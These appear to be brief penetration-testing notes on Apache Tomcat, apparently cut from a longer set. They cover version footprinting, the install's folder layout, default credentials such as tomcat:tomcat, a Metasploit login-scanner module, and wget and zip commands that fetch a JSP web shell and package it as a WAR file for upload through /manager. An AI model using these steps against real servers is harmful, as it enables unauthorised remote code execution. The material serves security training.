## Discovery/Footprinting
 method of detecting a Tomcat server and version is through the /docs page, Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.
 - Here is the general folder structure of a Tomcat installation:
````bash
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
````
### Enumeration
We may be able to either log in to one of these using weak credentials such as tomcat:tomcat, admin:admin, etc. If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a JSP web shell and obtain remote code execution on the Tomcat server.
## Attacking Tomcat
````bash
use auxiliary/scanner/http/tomcat_mgr_login
````
on /manager tab is deploy section when we can upload file which we can get from command:
````bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
````
and click deploy
